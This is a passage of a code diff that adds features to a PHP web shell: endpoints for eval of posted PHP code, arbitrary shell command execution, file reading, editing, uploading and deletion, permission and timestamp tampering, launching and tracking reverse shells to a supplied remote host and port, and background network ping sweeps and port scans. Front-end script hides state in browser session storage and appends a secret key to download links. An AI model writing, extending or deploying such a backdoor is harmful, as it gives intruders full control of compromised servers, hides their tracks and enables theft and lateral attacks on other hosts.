+                $response = array('status' => 'success', 'message' => "Kill signal sent to PID {$pid}."); 
+            } else { $response['message'] = 'Invalid PID provided.'; } 
+            break;
+        case 'php_eval': 
+            ob_start(); 
+            try { 
+                $code = isset($_POST['code']) ? $_POST['code'] : '';
+                eval($code); 
+            } catch (Exception $e) { 
+                echo "Error: " . $e->getMessage(); 
+            } catch (Throwable $t) {
+                echo "Error: " . $t->getMessage();
+            }
+            $response = array('status' => 'success', 'data' => ob_get_clean()); 
+            break;
+        case 'execute_cmd': 
+            $cmd = trim(isset($_POST['cmd']) ? $_POST['cmd'] : '');
+            $output = '';
+            $cwd = $_SESSION['terminal_cwd'];
+            
+            if (preg_match('/^\s*cd\s+(.*)$/i', $cmd, $matches)) {
+                $target_dir = trim($matches[1] ?: '~');
+                if ($target_dir === '~') $target_dir = $_SESSION['current_dir'];
+                $new_cwd = realpath($cwd . DIRECTORY_SEPARATOR . $target_dir);
+                if ($new_cwd && is_dir($new_cwd)) {
+                    $_SESSION['terminal_cwd'] = $new_cwd;
+                    $response = array('status' => 'success', 'output' => '', 'cwd' => $new_cwd);
+                } else {
+                    $response['message'] = 'cd: No such file or directory';
+                }
+            } else {
+                if (is_shellexec_enabled()) {
+                    $full_cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
+                    $output = @shell_exec($full_cmd);
+                } else {
+                    // PHP Fallbacks
+                    if ($cmd === 'whoami') {
+                        $user_info = get_current_user_host();
+                        $output = $user_info['user'] . "\n";
+                    } elseif ($cmd === 'pwd') {
+                        $output = $cwd . "\n";
+                    } elseif (preg_match('/^ls\s?(.*)$/', $cmd, $ls_matches)) {
+                        $ls_dir = trim($ls_matches[1]) ?: '.';
+                        $ls_path = realpath($cwd . DIRECTORY_SEPARATOR . $ls_dir);
+                        if ($ls_path && is_dir($ls_path)) {
+                            $files = scandir($ls_path);
+                            $output = implode("\n", $files) . "\n";
+                        } else { $output = "ls: cannot access '$ls_dir': No such file or directory\n"; }
+                    } elseif (preg_match('/^cat\s+(.*)$/', $cmd, $cat_matches)) {
+                        $cat_file = trim($cat_matches[1]);
+                        $cat_path = realpath($cwd . DIRECTORY_SEPARATOR . $cat_file);
+                        if ($cat_path && is_file($cat_path)) {
+                            $vkey = get_vault_key();
+                            $output = vault_decrypt(file_get_contents($cat_path), $vkey) . "\n";
+                        } else { $output = "cat: $cat_file: No such file or directory\n"; }
+                    } elseif ($cmd === 'id') {
+                        $user_info = get_current_user_host();
+                        $output = "uid=" . (function_exists('posix_getuid') ? posix_getuid() : 'N/A') . "(" . $user_info['user'] . ") groups=N/A\n";
+                    } elseif (preg_match('/^mkdir\s+(.*)$/', $cmd, $mk_matches)) {
+                        $new_dir = trim($mk_matches[1]);
+                        if (@mkdir($cwd . DIRECTORY_SEPARATOR . $new_dir)) { $output = ""; }
+                        else { $output = "mkdir: cannot create directory '$new_dir': Permission denied\n"; }
+                    } elseif (preg_match('/^rm\s+(.*)$/', $cmd, $rm_matches)) {
+                        $target = trim($rm_matches[1]);
+                        $target_path = $cwd . DIRECTORY_SEPARATOR . $target;
+                        if (is_dir($target_path)) {
+                            if (recursiveDeleteDirectory($target_path)) { $output = ""; }
+                            else { $output = "rm: cannot remove '$target': Permission denied\n"; }
+                        } else {
+                            if (@unlink($target_path)) { $output = ""; }
+                            else { $output = "rm: cannot remove '$target': No such file or directory\n"; }
+                        }
+                    } else {
+                        $output = "shell_exec is disabled and no PHP fallback for: $cmd\n";
+                    }
+                }
+                $response = array('status' => 'success', 'output' => $output, 'cwd' => $_SESSION['terminal_cwd']);
+            }
+            break;
+        case 'list_dir': 
+            $post_dir = isset($_POST['dir']) ? $_POST['dir'] : $_SESSION['current_dir'];
+            $dir = realpath($post_dir); 
+            if ($dir && is_dir($dir) && is_readable($dir)) { 
+                $_SESSION['current_dir'] = $dir; 
+                $response = array('status' => 'success', 'path' => $dir, 'listing' => getDirectoryListing($dir)); 
+            } else { $response['message'] = 'Directory not found or not readable.'; } 
+            break;
+        case 'get_file_content': 
+            $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); 
+            if ($path && is_file($path) && is_readable($path)) { 
+                $vkey = get_vault_key(); 
+                $response = array('status' => 'success', 'path' => $path, 'content' => vault_decrypt(file_get_contents($path), $vkey)); 
+            } else { $response['message'] = 'File not found or not readable.'; } 
+            break;
+        case 'save_file': 
+            $vkey = get_vault_key(); 
+            $content = isset($_POST['content']) ? $_POST['content'] : '';
+            if (file_put_contents($_POST['path'], vault_encrypt($content, $vkey)) !== false) { 
+                $response = array('status' => 'success', 'message' => basename($_POST['path']) . ' saved.'); 
+            } else { $response['message'] = 'Failed to save file.'; } 
+            break;
+        case 'delete_item': 
+            $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); 
+            if ($path && (is_dir($path) ? recursiveDeleteDirectory($path) : @unlink($path))) { 
+                $response = array('status' => 'success', 'message' => basename($path) . ' deleted.'); 
+            } else { $response['message'] = 'Failed to delete ' . basename($path) . '.'; } 
+            break;
+        case 'create_item': 
+            $name = trim(isset($_POST['name']) ? $_POST['name'] : ''); 
+            if ($name && strpbrk($name, "\\/?%*:|\"<>") === false) { 
+                $new_path = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $name; 
+                $type = $_POST['type']; 
+                if (file_exists($new_path)) { $response['message'] = 'Item already exists.'; } 
+                elseif (($type === 'dir' && @mkdir($new_path)) || ($type === 'file' && @touch($new_path))) { 
+                    $response = array('status' => 'success', 'message' => ucfirst($type) . ' created.'); 
+                } else { $response['message'] = 'Creation failed.'; } 
+            } else { $response['message'] = 'Invalid name.'; } 
+            break;
+        case 'rename_item': 
+            $old_path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); 
+            $new_name = trim(isset($_POST['new_name']) ? $_POST['new_name'] : ''); 
+            if ($old_path && !empty($new_name) && strpbrk($new_name, "\\/?%*:|\"<>") === false) { 
+                $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name; 
+                if (file_exists($new_path)) { $response['message'] = 'Destination name already exists.'; } 
+                elseif (@rename($old_path, $new_path)) { 
+                    $response = array('status' => 'success', 'message' => basename($old_path) . ' renamed to ' . $new_name); 
+                } else { $response['message'] = 'Rename failed. Check permissions.'; } 
+            } else { $response['message'] = 'Invalid old path or new name provided.'; } 
+            break;
+        case 'change_permissions': 
+            $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); 
+            $perms = isset($_POST['permissions']) ? $_POST['permissions'] : ''; 
+            if ($path && preg_match('/^[0-7]{3,4}$/', $perms)) { 
+                if (@chmod($path, octdec($perms))) { 
+                    $response = array('status' => 'success', 'message' => 'Permissions for ' . basename($path) . ' set to ' . $perms); 
+                } else { $response['message'] = 'Failed to set permissions.'; } 
+            } else { $response['message'] = 'Invalid path or permission format.'; } 
+            break;
+        case 'change_date': 
+            $path = realpath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['path']); 
+            $date_str = isset($_POST['new_date']) ? $_POST['new_date'] : 'now'; 
+            $timestamp = ($date_str === 'now') ? time() : strtotime($date_str); 
+            if ($path && $timestamp !== false) { 
+                if (@touch($path, $timestamp)) { 
+                    $response = array('status' => 'success', 'message' => 'Timestamp for ' . basename($path) . ' updated.'); 
+                } else { $response['message'] = 'Failed to update timestamp.'; } 
+            } else { $response['message'] = 'Invalid path or date format.'; } 
+            break;
+        case 'upload_files': 
+            $count = 0; 
+            $vkey = get_vault_key(); 
+            if (isset($_FILES['upload_files'])) {
+                foreach ($_FILES['upload_files']['tmp_name'] as $i => $tmp_name) { 
+                    if ($_FILES['upload_files']['error'][$i] == UPLOAD_ERR_OK) { 
+                        $file_content = file_get_contents($tmp_name); 
+                        $encrypted = vault_encrypt($file_content, $vkey); 
+                        if (file_put_contents($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . basename($_FILES['upload_files']['name'][$i]), $encrypted)) $count++; 
+                    } 
+                } 
+            }
+            $response = array('status' => 'success', 'message' => "$count file(s) uploaded."); 
+            break;
+        case 'execute_revshell_cmd': 
+            if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is required.'; break; } 
+            $command = isset($_POST['command']) ? $_POST['command'] : ''; 
+            $rhost = isset($_POST['rhost']) ? $_POST['rhost'] : 'N/A'; 
+            $rport = isset($_POST['rport']) ? $_POST['rport'] : 'N/A'; 
+            if (!empty($command)) { 
+                $bg_cmd = 'nohup ' . $command . ' > /dev/null 2>&1 & echo $!'; 
+                $pid = get_os_type() === 'WIN' ? 'N/A' : trim(@shell_exec($bg_cmd)); 
+                $_SESSION['reverse_shells'][uniqid()] = array('pid' => $pid, 'host' => $rhost, 'port' => $rport, 'time' => date('Y-m-d H:i:s')); 
+                $response = array('status' => 'success', 'message' => 'Reverse shell command executed.', 'sessions' => $_SESSION['reverse_shells']); 
+            } else { $response['message'] = 'Empty command.'; } 
+            break;
+        case 'get_revshell_sessions': $response = array('status' => 'success', 'sessions' => $_SESSION['reverse_shells']); break;
+        case 'check_revshell_status': 
+            $statuses = array(); 
+            $is_win = get_os_type() === 'WIN'; 
+            foreach ($_SESSION['reverse_shells'] as $id => $session) { 
+                $pid = $session['pid']; 
+                $is_running = false; 
+                if (is_numeric($pid) && $pid > 0 && is_shellexec_enabled()) { 
+                    if ($is_win) { 
+                        $output = @shell_exec("tasklist /FI \"PID eq {$pid}\""); 
+                        if (strpos($output, (string)$pid) !== false) $is_running = true; 
+                    } else { 
+                        $output = @shell_exec("ps -p {$pid}"); 
+                        if (count(explode("\n", trim($output))) > 1) $is_running = true; 
+                    } 
+                } 
+                $statuses[$id] = $is_running ? 'Online' : 'Offline'; 
+            } 
+            $response = array('status' => 'success', 'statuses' => $statuses); 
+            break;
+        case 'kill_revshell': 
+            $id = $_POST['id']; 
+            $pid = $_SESSION['reverse_shells'][$id]['pid']; 
+            if ($pid && $pid !== 'N/A') @shell_exec("kill -9 {$pid}"); 
+            unset($_SESSION['reverse_shells'][$id]); 
+            $response = array('status' => 'success', 'message' => 'Session terminated.', 'sessions' => $_SESSION['reverse_shells']); 
+            break;
         case 'start_scan': 
             if (!is_shellexec_enabled()) { $response['message'] = 'shell_exec is required.'; break; } 
             $scan_id = 'scan_' . uniqid(); 
@@ -138,14 +598,14 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
             $php_script = '<?php set_time_limit(0); ignore_user_abort(true); ini_set("display_errors",0); $file = "'.$result_file.'"; $pid_file = "'.$pid_file.'"; file_put_contents($pid_file, getmypid());'; 
             if ($scan_type === 'network') { 
                 $range_str = $_POST['range']; 
-                $ips = []; 
+                $ips = array(); 
                 if (strpos($range_str, '/') !== false) { list($subnet, $mask) = explode('/', $range_str); $subnet = ip2long($subnet); $mask = 32 - $mask; $total = 1 << $mask; for ($i = 1; $i < $total -1; $i++) { $ips[] = long2ip($subnet + $i); } } elseif (strpos($range_str, '-') !== false) { list($start, $end) = explode('-', $range_str); $start_ip_base = substr($start, 0, strrpos($start, '.')); $start_host = substr($start, strrpos($start, '.') + 1); for ($i = $start_host; $i <= $end; $i++) { $ips[] = "$start_ip_base.$i"; } } else { $ips[] = $range_str; } 
                 $php_script .= '$ips = '.var_export($ips, true).'; $total = count($ips); $os = "'.get_os_type().'";'; 
                 $php_script .= 'foreach($ips as $i => $ip) { if(!file_exists($pid_file)) exit(); $cmd = ($os === "WIN") ? "ping -n 1 -w 500 " . $ip : "ping -c 1 -W 0.5 " . $ip; $output = shell_exec($cmd); if (stripos($output, "ttl") !== false) { file_put_contents($file, $ip."\n", FILE_APPEND); } file_put_contents($file, "progress:".ceil((($i+1)/$total)*100)."\n", FILE_APPEND); }'; 
             } elseif ($scan_type === 'port') { 
                 $ips = json_decode($_POST['ips'], true); 
                 $ports_str = $_POST['ports']; 
-                $ports = []; 
+                $ports = array(); 
                 foreach(explode(',', $ports_str) as $part) { if(strpos($part, '-') !== false) { list($start, $end) = explode('-', $part); $ports = array_merge($ports, range($start, $end)); } else { $ports[] = (int)$part; } } $ports = array_unique($ports); 
                 $php_script .= '$ips = '.var_export($ips, true).'; $ports = '.var_export($ports, true).'; $total = count($ips) * count($ports); $scanned = 0;'; 
                 $php_script .= 'foreach($ips as $ip) { foreach($ports as $port) { if(!file_exists($pid_file)) exit(); $conn = @fsockopen($ip, $port, $errno, $errstr, 0.1); if (is_resource($conn)) { file_put_contents($file, $ip.":".$port."\n", FILE_APPEND); fclose($conn); } $scanned++; file_put_contents($file, "progress:".ceil(($scanned/$total)*100)."\n", FILE_APPEND); } }'; 
@@ -153,14 +613,43 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
             $php_script .= 'file_put_contents($file, "done\n", FILE_APPEND); @unlink($pid_file); ?>'; 
             file_put_contents($script_file, $php_script); 
             pclose(popen((get_os_type() === 'WIN' ? 'start /B ' : 'nohup ') . "php -f {$script_file} > /dev/null 2>&1 &", 'r')); 
-            $response = ['status' => 'success', 'scan_id' => $scan_id]; 
+            $response = array('status' => 'success', 'scan_id' => $scan_id); 
             break;
-        case 'check_scan_progress': $scan_id = $_POST['scan_id']; $result_file = sys_get_temp_dir() . "/$scan_id.log"; if (file_exists($result_file)) { $content = file_get_contents($result_file); $lines = explode("\n", trim($content)); $results = []; $progress = 0; $done = false; foreach ($lines as $line) { if (strpos($line, 'progress:') === 0) { $progress = (int)substr($line, 9); } elseif ($line === 'done') { $done = true; @unlink($result_file); @unlink(sys_get_temp_dir() . "/$scan_id.php"); } elseif (!empty($line)) { $results[] = $line; } } $response = ['status' => 'success', 'results' => $results, 'progress' => $progress, 'done' => $done]; } break;
-        case 'stop_scan': $scan_id = $_POST['scan_id']; $pid_file = sys_get_temp_dir() . "/$scan_id.pid"; if (file_exists($pid_file)) { $pid = file_get_contents($pid_file); if ($pid) { @shell_exec(get_os_type() === 'WIN' ? "taskkill /PID $pid /F" : "kill -9 $pid"); } @unlink($pid_file); @unlink(sys_get_temp_dir() . "/$scan_id.log"); @unlink(sys_get_temp_dir() . "/$scan_id.php"); } $response = ['status' => 'success', 'message' => 'Scan terminated.']; break;
-        case 'get_phpinfo': ob_start(); phpinfo(); $phpinfo_html = ob_get_clean(); preg_match('/<body[^>]*>(.*?)<\/body>/is', $phpinfo_html, $matches); $response = ['status' => 'success', 'data' => $matches[1] ?? 'Could not parse phpinfo() output.']; break;
+        case 'check_scan_progress': 
+            $scan_id = $_POST['scan_id']; 
+            $result_file = sys_get_temp_dir() . "/$scan_id.log"; 
+            if (file_exists($result_file)) { 
+                $content = file_get_contents($result_file); 
+                $lines = explode("\n", trim($content)); 
+                $results = array(); $progress = 0; $done = false; 
+                foreach ($lines as $line) { 
+                    if (strpos($line, 'progress:') === 0) { $progress = (int)substr($line, 9); } 
+                    elseif ($line === 'done') { $done = true; @unlink($result_file); @unlink(sys_get_temp_dir() . "/$scan_id.php"); } 
+                    elseif (!empty($line)) { $results[] = $line; } 
+                } 
+                $response = array('status' => 'success', 'results' => $results, 'progress' => $progress, 'done' => $done); 
+            } 
+            break;
+        case 'stop_scan': 
+            $scan_id = $_POST['scan_id']; 
+            $pid_file = sys_get_temp_dir() . "/$scan_id.pid"; 
+            if (file_exists($pid_file)) { 
+                $pid = file_get_contents($pid_file); 
+                if ($pid) { @shell_exec(get_os_type() === 'WIN' ? "taskkill /PID $pid /F" : "kill -9 $pid"); } 
+                @unlink($pid_file); @unlink(sys_get_temp_dir() . "/$scan_id.log"); @unlink(sys_get_temp_dir() . "/$scan_id.php"); 
+            } 
+            $response = array('status' => 'success', 'message' => 'Scan terminated.'); 
+            break;
+        case 'get_phpinfo': 
+            ob_start(); 
+            phpinfo(); 
+            $phpinfo_html = ob_get_clean(); 
+            preg_match('/<body[^>]*>(.*?)<\/body>/is', $phpinfo_html, $matches); 
+            $response = array('status' => 'success', 'data' => isset($matches[1]) ? $matches[1] : 'Could not parse phpinfo() output.'); 
+            break;
     }
     echo json_encode($response);
-    exit;
+    return;
 }
 ?>
 <!DOCTYPE html>
@@ -274,7 +763,6 @@ if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQ
 document.addEventListener('DOMContentLoaded', () => {
     const G = id => document.getElementById(id);
     
-    // RAM-Only State Management: Prefer sessionStorage over hardcoded PHP values
     const state = { 
         terminalCwd: sessionStorage.getItem('v_tcwd') || '<?php echo addslashes($_SESSION['terminal_cwd']); ?>', 
         currentFileForEditor: '', 
@@ -289,15 +777,12 @@ document.addEventListener('DOMContentLoaded', () => {
     const formatBytes = b => {if(!+b)return"N/A";const k=1024,s=["B","KB","MB","GB","TB"],i=Math.floor(Math.log(b)/Math.log(k));return`${parseFloat((b/k**i).toFixed(2))} ${s[i]}`};
     const showToast = (message) => { const toast = G('toast'); toast.textContent = message; toast.style.display = 'block'; setTimeout(() => { toast.style.display = 'none'; }, 4000); };
     
-    // Updated API Request handler to sync directory state to browser RAM
     const apiRequest = async formData => { 
         try { 
-            // 1. Pull the key and current paths from the browser's RAM (sessionStorage)
             const k = sessionStorage.getItem('v_key');
             const cwd = sessionStorage.getItem('v_cwd') || '';
             const tcwd = sessionStorage.getItem('v_tcwd') || '';
 
-            // 2. Send the request with the specific headers the Loader expects
             const response = await fetch('', { 
                 method: 'POST', 
                 headers: { 
@@ -314,7 +799,6 @@ document.addEventListener('DOMContentLoaded', () => {
             const data = await response.json(); 
             if (data.status === 'error') throw new Error(data.message || 'Unknown API error'); 
             
-            // 3. If the server tells us we moved to a new folder, update the browser RAM
             if (data.path) sessionStorage.setItem('v_cwd', data.path);
             if (data.cwd) {
                 sessionStorage.setItem('v_tcwd', data.cwd);
@@ -324,7 +808,6 @@ document.addEventListener('DOMContentLoaded', () => {
             if (data.message) showToast(data.message); 
             return data; 
         } catch (error) { 
-            // If this triggers, it usually means the decryption key was lost or is wrong
             showToast("RAM Session Error: Re-Mounting might be required."); 
             console.error(error);
             return null; 
@@ -345,7 +828,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const data = await apiRequest(buildFormData({ action: 'list_dir', dir: targetDir })); 
         if (data) { 
             G('path-bar').textContent = data.path; 
-            G('file-manager-tbody').innerHTML = data.listing.map(item => `<tr><td>${item.is_dir ? `<a href="#" data-dir="${item.name}"; style="color:black">${item.name}</a>` : `<a href="#" data-action="preview" data-path="${item.name}"; style="color: orange"; title="Preview file content">${item.name}</a>`}</td><td>${item.type}</td><td>${item.size === '-' ? '-' : formatBytes(item.size)}</td><td>${item.modified}</td><td style="font-family:monospace; font-size: 0.9em; color: #00FF00">${item.permissions}</td><td class="actions">${!item.is_dir ? `<button data-action="edit" data-path="${item.name}" title="Edit">📝</button>` : ''}<button data-action="perms" data-path="${item.name}" data-current-perms="${item.permissions_oct}" title="Change Permissions">⚙️</button><button data-action="rename" data-path="${item.name}" title="Rename">✏️</button><button data-action="date" data-path="${item.name}" title="Change Date">🗓️</button>${!item.is_dir ? `<a href="?action=download&file=${encodeURIComponent(item.name)}" class="button-link" title="Download">⬇️</a>` : ''}<button data-action="delete" data-path="${item.name}" class="danger">Del</button></td></tr>`).join(''); 
+            G('file-manager-tbody').innerHTML = data.listing.map(item => `<tr><td>${item.is_dir ? `<a href="#" data-dir="${item.name}" style="color:black">${item.name}</a>` : `<a href="#" data-action="preview" data-path="${item.name}" style="color: orange" title="Preview file content">${item.name}</a>`}</td><td>${item.type}</td><td>${item.size === '-' ? '-' : formatBytes(item.size)}</td><td>${item.modified}</td><td style="font-family:monospace; font-size: 0.9em; color: #00FF00">${item.permissions}</td><td class="actions">${!item.is_dir ? `<button data-action="edit" data-path="${item.name}" title="Edit">📝</button>` : ''}<button data-action="perms" data-path="${item.name}" data-current-perms="${item.permissions_oct}" title="Change Permissions">⚙️</button><button data-action="rename" data-path="${item.name}" title="Rename">✏️</button><button data-action="date" data-path="${item.name}" title="Change Date">🗓️</button>${!item.is_dir ? `<a href="?action=download&file=${encodeURIComponent(item.name)}&<?php echo $g_k . '=' . $g_v; ?>" class="button-link" title="Download">⬇️</a>` : ''}<button data-action="delete" data-path="${item.name}" class="danger">Del</button></td></tr>`).join(''); 
         } 
     };
     G('file-manager-tbody').addEventListener('click', e => { const dirLink = e.target.closest('a[data-dir]'); const actionTarget = e.target.closest('[data-action]'); if (dirLink) { e.preventDefault(); loadFileManager(G('path-bar').textContent + '/' + dirLink.dataset.dir); return; } if (actionTarget) { e.preventDefault(); const action = actionTarget.dataset.action; const path = actionTarget.dataset.path; const currentPath = G('path-bar').textContent; if (action === 'delete') { if (confirm(`Are you sure you want to delete "${path}"?`)) { apiRequest(buildFormData({ action: 'delete_item', path })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'edit' || action === 'preview') { apiRequest(buildFormData({ action: 'get_file_content', path })).then(data => { if (data) { state.currentFileForEditor = data.path; G('editor-header').textContent = `File: ${data.path}`; G('file-content-textarea').value = data.content; G('editor-modal').style.display = 'flex'; } }); } else if (action === 'rename') { const newName = prompt(`Enter new name for "${path}":`, path); if (newName && newName !== path) { apiRequest(buildFormData({ action: 'rename_item', path, new_name: newName })).then(d => d && loadFileManager(currentPath)); } } else if (action === 'perms') { const currentPerms = actionTarget.dataset.currentPerms || '0644'; const newPerms = prompt(`Enter new permissions for "${path}" (octal format):`, currentPerms); if (newPerms && /^[0-7]{3,4}$/.test(newPerms)) { apiRequest(buildFormData({ action: 'change_permissions', path, permissions: newPerms })).then(d => d && loadFileManager(currentPath)); } else if (newPerms !== null) { showToast('Invalid format. Please use 3 or 4 octal digits (e.g., 0755).'); } } else if (action === 'date') { const newDate = prompt(`Enter a new date/time for "${path}":\n(e.g., "now", "2024-01-01 12:00:00")`, "now"); if (newDate) { apiRequest(buildFormData({ action: 'change_date', path, new_date: newDate })).then(d => d && loadFileManager(currentPath)); } } } });
@@ -380,6 +863,6 @@ document.addEventListener('DOMContentLoaded', () => {
 </script>
 </body>
 </html>
-<?php exit; ?>
+<?php return; ?>
 /*__INTERNAL_DATA_START__*/
 e30=
